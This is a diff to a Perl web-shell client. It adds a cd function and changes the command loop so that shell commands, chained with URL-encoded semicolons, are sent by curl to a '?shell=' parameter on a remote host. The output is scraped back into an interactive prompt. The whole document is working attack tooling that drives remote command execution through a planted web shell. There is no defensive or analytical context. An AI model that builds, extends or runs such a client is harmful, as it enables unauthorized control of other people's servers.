@@ -48,7 +48,10 @@ sub StripTags{
 }
 
 sub cd{
-#todo
+	my $input = $_[0];
+	$pwd = `curl -s $loc?shell=$input%3Bpwd | tail -1`;
+	StripTags($pwd);
+	$pwd =~ s/^\s+|\s+$//g;	
 }
 
 sub URLEncode{
@@ -80,11 +83,11 @@ sub shell{
 	if ($input eq "quit" || $input eq "exit"){
 		exit;
 	}
-	if ($input =~ m/^cd/){ #not implemented yet
-		cd();
+	if ($input =~ m/cd%20\S+/){ #not implemented yet
+		cd($input);
 	}
 
-	chomp(my $output = `curl -s $loc?shell=$input`); #runs command and captures output
+	chomp(my $output = `curl -s $loc?shell=cd%20$pwd%3B$input`); #runs command and captures output
 	#clean up output
 	StripTags($output,1);
 	chomp($output);
